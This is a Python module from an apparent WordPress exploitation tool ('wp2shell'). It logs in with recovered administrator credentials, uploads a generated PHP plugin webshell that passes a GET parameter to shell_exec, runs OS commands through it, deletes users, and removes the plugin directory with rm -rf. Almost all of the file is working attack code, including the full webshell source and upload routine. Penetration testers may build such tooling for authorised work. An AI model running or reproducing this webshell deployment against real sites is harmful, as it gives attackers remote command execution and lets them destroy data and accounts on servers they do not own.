"""Post-authentication code execution: deploy a plugin webshell and run commands.

Remote code execution requires valid administrator credentials. The SQL injection recovers the
administrator password *hash*; the corresponding plaintext (recovered offline) is supplied here.
"""

from __future__ import annotations

import http.cookiejar
import io
import re
import secrets
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile
from typing import Dict, Optional, Tuple

from .client import TargetError, tls_handlers

_MARKER = "WP2SHELL"


class AdminSession:
    """An authenticated admin session that can deploy a webshell and execute OS commands."""

    def __init__(
        self,
        base_url: str,
        *,
        timeout: float = 20.0,
        proxy: Optional[str] = None,
        user_agent: str = "wp2shell",
        verify: bool = True,
    ) -> None:
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        # Randomised path + token so the dropped webshell is not a predictable, world-usable RCE.
        self._slug = "wp2shell_" + secrets.token_hex(4)
        self._token = secrets.token_hex(16)
        self._jar = http.cookiejar.CookieJar()
        handlers = [urllib.request.HTTPCookieProcessor(self._jar)]
        if proxy:
            handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        handlers += tls_handlers(verify)
        self._opener = urllib.request.build_opener(*handlers)
        self._opener.addheaders = [("User-Agent", user_agent)]

    def login(self, username: str, password: str) -> bool:
        self._get("/wp-login.php")  # establish the test cookie
        self._post(
            "/wp-login.php",
            {
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": f"{self.base_url}/wp-admin/",
                "testcookie": "1",
            },
        )
        return any(c.name.startswith("wordpress_logged_in") for c in self._jar)

    def deploy_webshell(self) -> str:
        """Upload the webshell plugin and return its web-reachable path."""
        page = self._get("/wp-admin/plugin-install.php?tab=upload")
        nonce = self._nonce(page)
        if not nonce:
            raise RuntimeError("plugin-upload nonce not found (are the credentials valid?)")
        body, content_type = self._multipart(
            {
                "_wpnonce": nonce,
                "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload",
                "install-plugin-submit": "Install Now",
            },
            {"pluginzip": (f"{self._slug}.zip", self._plugin_zip())},
        )
        self._post("/wp-admin/update.php?action=upload-plugin", body, {"Content-Type": content_type})
        return f"/wp-content/plugins/{self._slug}/{self._slug}.php"

    def run(self, shell_path: str, command: str) -> Optional[str]:
        query = urllib.parse.urlencode({"t": self._token, "c": command})
        output = self._get(f"{shell_path}?{query}")
        match = re.search(rf"{_MARKER}::(.*?)::END", output, re.S)
        return match.group(1) if match else None

    def cleanup(self, shell_path: str) -> bool:
        """Delete the webshell plugin directory from the target (best effort).

        The generated webshell changes to its own plugin directory before
        executing commands. The case guard refuses to delete anything that does
        not look like a plugins directory. A subsequent 404 confirms removal.
        """
        try:
            out = self.run(
                shell_path,
                'd=$(pwd); case "$d" in */wp-content/plugins/*) cd / && rm -rf "$d";; esac',
            )
        except (OSError, TargetError):
            return False
        if out is None:
            return False
        try:
            self._get(shell_path)
        except urllib.error.HTTPError as exc:
            return exc.code == 404
        except (OSError, TargetError):
            return False
        return False

    def delete_user_with_shell(self, shell_path: str, username: str, *, reassign_to: int) -> bool:
        query = urllib.parse.urlencode(
            {
                "t": self._token,
                "delete_user": username,
                "reassign": str(reassign_to),
            }
        )
        output = self._get(f"{shell_path}?{query}")
        match = re.search(rf"{_MARKER}::(.*?)::END", output, re.S)
        return bool(match and match.group(1).strip() == "deleted")

    # -- helpers ------------------------------------------------------------

    def _get(self, path: str) -> str:
        return self._open(self.base_url + path)

    def _post(self, path: str, data, headers: Optional[dict] = None) -> str:
        if isinstance(data, dict):
            data = urllib.parse.urlencode(data).encode()
        request = urllib.request.Request(self.base_url + path, data=data, headers=headers or {})
        return self._open(request)

    def _open(self, target) -> str:
        # Wrap connection failures in TargetError so an unreachable host reads like check/read; leave
        # HTTPError alone -- a 4xx/5xx is an auth/permission signal, not a liveness one.
        try:
            return self._opener.open(target, timeout=self.timeout).read().decode("utf-8", "replace")
        except urllib.error.HTTPError:
            raise
        except OSError as exc:
            reason = getattr(exc, "reason", exc)
            raise TargetError(f"cannot reach {self.base_url}: {reason}") from None

    def _plugin_zip(self) -> bytes:
        # The webshell only runs when the request carries the per-session token.
        php = (
            "<?php\n"
            "/*\nPlugin Name: wp2shell\nDescription: Temporary command runner.\n*/\n"
            f"if (hash_equals('{self._token}', (string) ($_GET['t'] ?? '')) && isset($_GET['c'])) {{\n"
            "    chdir(__DIR__);\n"
            f"    echo '{_MARKER}::' . shell_exec((string) $_GET['c']) . '::END';\n"
            f"}} elseif (hash_equals('{self._token}', (string) ($_GET['t'] ?? '')) && isset($_GET['delete_user'])) {{\n"
            "    require_once dirname(__DIR__, 3) . '/wp-load.php';\n"
            "    require_once ABSPATH . 'wp-admin/includes/user.php';\n"
            "    $user = get_user_by('login', (string) $_GET['delete_user']);\n"
            "    $ok = $user ? wp_delete_user((int) $user->ID, (int) ($_GET['reassign'] ?? 0)) : false;\n"
            f"    echo '{_MARKER}::' . ($ok ? 'deleted' : 'failed') . '::END';\n"
            "}\n"
        )
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(f"{self._slug}/{self._slug}.php", php)
        return buffer.getvalue()

    @staticmethod
    def _nonce(html: str) -> Optional[str]:
        # Take the _wpnonce belonging to the plugin-upload form, not the first nonce on the page.
        form = re.search(r'action="[^"]*action=upload-plugin".*?name="_wpnonce"[^>]*value="([0-9a-f]+)"',
                         html, re.S)
        if form:
            return form.group(1)
        tag = re.search(r'<input[^>]*name="_wpnonce"[^>]*value="([0-9a-f]+)"', html)
        return tag.group(1) if tag else None

    @staticmethod
    def _multipart(fields: Dict[str, str], files: Dict[str, Tuple[str, bytes]]) -> Tuple[bytes, str]:
        boundary = "----wp2shell" + uuid.uuid4().hex
        buffer = io.BytesIO()
        for name, value in fields.items():
            buffer.write(f"--{boundary}\r\n".encode())
            buffer.write(f'Content-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'.encode())
        for name, (filename, content) in files.items():
            buffer.write(f"--{boundary}\r\n".encode())
            buffer.write(
                f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'.encode()
            )
            buffer.write(b"Content-Type: application/octet-stream\r\n\r\n" + content + b"\r\n")
        buffer.write(f"--{boundary}--\r\n".encode())
        return buffer.getvalue(), f"multipart/form-data; boundary={boundary}"
